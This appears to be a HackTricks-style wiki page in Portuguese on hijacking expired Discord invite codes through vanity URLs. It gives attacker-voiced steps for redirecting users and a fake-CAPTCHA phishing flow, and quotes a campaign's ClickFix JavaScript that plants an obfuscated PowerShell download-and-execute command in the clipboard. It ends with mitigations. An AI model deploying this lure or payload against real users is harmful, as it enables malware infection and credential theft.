# Hijacking de Convites do Discord

{{#include ../../banners/hacktricks-training.md}}

O hijacking de convites do Discord explora as regras de reutilização de links vanity personalizados: um código de convite temporário expirado, ou um código permanente excluído composto apenas por letras minúsculas e dígitos, pode ser registrado como um link vanity em um servidor com Level 3 Boost. Um link vanity personalizado também pode ficar disponível quando o servidor original perde seu Level 3 Boost; para um convite temporário com letras maiúsculas, um atacante pode pré-registrar a forma vanity em letras minúsculas enquanto o convite normal permanece ativo, mas o redirecionamento começa somente após a expiração desse convite.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipos de Convite e Risco de Hijacking

O risco observado varia de acordo com o tipo de convite:<sup>[[1]](#references)[[2]](#references)</sup>

| Tipo de Convite           | Pode sofrer Hijacking? | Condição / Comentários                                                                                       |
|---------------------------|-------------------------|---------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link     | ✅                      | Após a expiração, o código fica disponível e pode ser registrado novamente como uma vanity URL por um servidor com Boost. |
| Permanent Invite Link     | ⚠️                      | Se for excluído e for composto apenas por letras minúsculas e dígitos, o código poderá ficar disponível novamente.        |
| Custom Vanity Link        | ✅                      | Se o servidor original perder seu Level 3 Boost, seu convite vanity ficará disponível para um novo registro.    |

## Etapas da Exploração

1. Reconnaissance
- Monitore fontes públicas (fóruns, redes sociais, canais do Telegram) em busca de links de convite que correspondam ao padrão `discord.gg/{code}` ou `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Colete códigos de convite de interesse (temporários ou vanity).<sup>[[1]](#references)</sup>
2. Pré-registro
- Crie ou use um servidor Discord existente com privilégios de Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Em **Server Settings → Vanity URL**, tente atribuir o código de convite alvo. Se aceito, o código será reservado pelo servidor malicioso.<sup>[[1]](#references)</sup>
3. Ativação do Hijacking
- Para convites temporários, aguarde até que o convite original expire (ou exclua-o manualmente se você controlar a origem).<sup>[[1]](#references)</sup>
- Para códigos que contêm letras maiúsculas, a variante em letras minúsculas pode ser reivindicada imediatamente, embora o redirecionamento só seja ativado após a expiração.<sup>[[1]](#references)</sup>
4. Redirecionamento Silencioso
- Os usuários que acessarem o link antigo serão enviados automaticamente para o servidor controlado pelo atacante assim que o hijacking estiver ativo.<sup>[[1]](#references)</sup>

## Fluxo de Phishing via Servidor do Discord

1. Restrinja os canais do servidor para que apenas um canal **#verify** fique visível.<sup>[[1]](#references)</sup>
2. Implante um bot (por exemplo, **Safeguard#0786**) para solicitar que os recém-chegados façam a verificação via OAuth2.<sup>[[1]](#references)</sup>
3. O bot redireciona os usuários para um site de phishing (por exemplo, `captchaguard.me`) sob o pretexto de uma etapa de CAPTCHA ou verificação.<sup>[[1]](#references)</sup>
4. Implemente o truque de UX **ClickFix**:<sup>[[1]](#references)</sup>
- Exiba uma mensagem informando que o CAPTCHA está corrompido.
- Oriente os usuários a abrir a janela **Win+R**, colar um comando PowerShell pré-carregado e pressionar Enter.

### Exemplo de Injeção na Área de Transferência do ClickFix

A campanha usou JavaScript para copiar um comando PowerShell malicioso para a área de transferência:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Esta abordagem evita downloads diretos de arquivos e utiliza elementos familiares da UI para reduzir a suspeita dos usuários.<sup>[[1]](#references)</sup>

## Mitigations

- Prefira links de convite permanentes e certifique-se de que o código contenha pelo menos uma letra maiúscula; códigos permanentes excluídos que contenham letras maiúsculas não podem ser reutilizados como vanity links.<sup>[[1]](#references)</sup>
- Faça a rotação regular dos códigos de convite e revogue links antigos.
- Monitore o status de boost do servidor Discord e as reivindicações de URLs personalizadas.<sup>[[1]](#references)[[2]](#references)</sup>
- Oriente os usuários a verificar a autenticidade do servidor e evitar executar comandos colados a partir da área de transferência.

## References

- [1] [Da confiança à ameaça: convites do Discord sequestrados usados para distribuição de malware em múltiplas etapas](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Link de convite personalizado – Suporte do Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
